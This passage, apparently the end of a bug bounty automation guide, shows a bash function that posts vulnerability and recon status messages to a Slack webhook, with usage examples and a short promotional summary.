SLACK_WEBHOOK_URL="YOUR_SLACK_WEBHOOK_URL"

send_slack_notification() {
    local message=$1
    local color=$2
    local title=$3
    
    curl -X POST -H 'Content-type: application/json' \
        --data "{
            \"attachments\": [
                {
                    \"color\": \"$color\",
                    \"title\": \"$title\",
                    \"text\": \"$message\",
                    \"footer\": \"Elite Bug Bounty Bot\",
                    \"ts\": $(date +%s)
                }
            ]
        }" \
        $SLACK_WEBHOOK_URL
}

# Usage examples:
# send_slack_notification "XSS vulnerability found on target.com" "danger" "🚨 Critical Vulnerability Found"
# send_slack_notification "Reconnaissance completed for target.com" "good" "✅ Recon Complete"
```

This comprehensive automation and aliases configuration provides elite-level bug bounty hunting capabilities with advanced scripts, custom functions, and professional reporting systems. The setup includes everything from basic aliases to complex automation workflows that can significantly speed up the reconnaissance and vulnerability discovery process.